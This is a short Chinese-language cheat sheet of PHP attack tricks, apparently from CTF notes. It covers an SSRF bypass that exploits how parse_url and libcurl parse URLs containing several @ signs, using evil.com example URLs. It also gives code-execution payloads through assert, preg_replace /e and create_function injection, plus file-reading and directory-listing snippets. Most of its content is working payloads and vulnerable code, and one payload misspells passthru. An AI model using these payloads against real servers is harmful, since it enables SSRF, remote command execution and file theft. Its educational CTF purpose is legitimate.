# PHP trick

https://paper.seebug.org/561/#parse_urllibcurlurlssrf



`Parse_url`

##### parse_url与libcurl对与url的解析差异可能导致ssrf

- 当url中有多个@符号时，**parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。**因此当代码对`http://user@eval.com:80@baidu.com` 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过
- 此外对于`https://evil@baidu.com`这样的域名进行解析时,php获取的host是`evil@baidu.com`，但是libcurl获取的host却是evil.com

##### url标准的灵活性导致绕过filter_var与parse_url进行ssrf

`assert`

参数过滤不当，执行php语句

```php
assert("file_get_contents('2333.pdf') and system('dir')");
```

`passthru`
命令执行

```php
<?php
if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}
```

payload:
```?pat=/a/e&passru('ls%20-al')&sub=a
```

`copy`

拷贝文件

`readfile`
直接输出文件内容
```php
<?php
echo readfile('D:\\flag');
?>
```
输出内容加长度

`eval`

不带引号翻目录
`getcwd()`获取当前绝对路径
`dirname`返回上一级路径
`scandir`列目录文件

```php
<?php
var_dump(dirname(getcwd()));
```

`session_start`

session_start(option) 可以通过设置`option`设置`session`配置

![img](https://raw.githubusercontent.com/wiki/imtinmin/photo/php-session/4.png)

![img](https://raw.githubusercontent.com/wiki/imtinmin/photo/php-session/3.png)

```
session(array('save_path=/tmp'))
```

`create_function`
执行任意php代码
```php
<?php
create_function('','return "123";}phpinfo();//')
```

构造
```php
function abc(){
	return "123";}phpinfo();//
}
```